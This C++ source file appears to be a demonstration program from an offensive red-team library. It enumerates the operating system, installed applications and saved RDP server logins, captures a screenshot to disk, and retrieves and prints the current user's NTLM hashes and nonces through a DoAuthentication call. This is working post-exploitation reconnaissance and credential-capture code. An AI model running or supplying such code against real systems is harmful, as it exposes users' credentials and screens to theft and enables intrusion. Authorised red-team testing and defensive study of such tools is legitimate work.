/*
* Author: Hegusung
* Github: https://github.com/hegusung/RedCpp
*/

#include <iostream>
#include "../lib/localhost.h"
#include "../lib/server.h"

void getSystemInfo()
{
	Localhost host = Localhost();

	SystemInfo* systeminfo = host.getSystemInfo();

	if (systeminfo != NULL)
	{
		printf("SystemInfo:\n");
		wprintf(L"OS Name: %s\n", systeminfo->os_name.c_str());
		wprintf(L"OS Arch: %s\n", systeminfo->os_arch.c_str());
		wprintf(L"Install date: %s\n", systeminfo->install_date.c_str());
		wprintf(L"Last boot date: %s\n", systeminfo->last_boot_date.c_str());
	}
	else
	{
		printf("Unable to get system info\n");
	}


	std::list<Application> apps = host.getApplications();

	printf("Applications:\n");
	for (std::list<Application>::iterator iterator = apps.begin(), end = apps.end(); iterator != end; ++iterator)
	{
		Application app = *iterator;

		printf(" - %s : %s\n", app.name.c_str(), app.version.c_str());
	}

	printf("RDP servers:\n");
	std::list<RDPServer> rdp_list = host.getRDPServers();
	for (std::list<RDPServer>::iterator iterator = rdp_list.begin(), end = rdp_list.end(); iterator != end; ++iterator)
	{
		RDPServer rdp = *iterator;

		printf(" - %s : %s\n", rdp.username.c_str(), rdp.server.c_str());
	}

}

void screenshot(const char* path)
{
	Localhost host = Localhost();

	vectByte screenshot = host.screenshot();

#pragma warning(suppress : 4996)
	FILE* f = fopen(path, "wb");

	fwrite((unsigned char*)&screenshot[0], 1, screenshot.size(), f);

	fclose(f);
}

void getSelfHash()
{
	std::string res;
	Hash* hash = DoAuthentication();

	if (hash != NULL)
	{
		printf("Username: %s\n", hash->username.c_str());
		printf("Computer: %s\n", hash->computer.c_str());

		if (hash->type == 1)
		{
			printf("Nonce: %s\n", hash->nonce.c_str());
			printf("LMHash: %s\n", hash->lmhash.c_str());
			printf("NTHash: %s\n", hash->nthash.c_str());
		}
		else if (hash->type == 2)
		{
			printf("Nonce: %s\n", hash->nonce.c_str());
			printf("Client Nonce: %s\n", hash->client_nonce.c_str());
			printf("NTHash: %s\n", hash->nthash.c_str());
		}

		delete hash;
	}
	else
		printf("Failed to retrieve hash\n");



}

int main()
{
	getSystemInfo();

	printf("\n==========================================\n\n");

	screenshot("screenshot.png");

	printf("\n==========================================\n\n");

	getSelfHash();
}

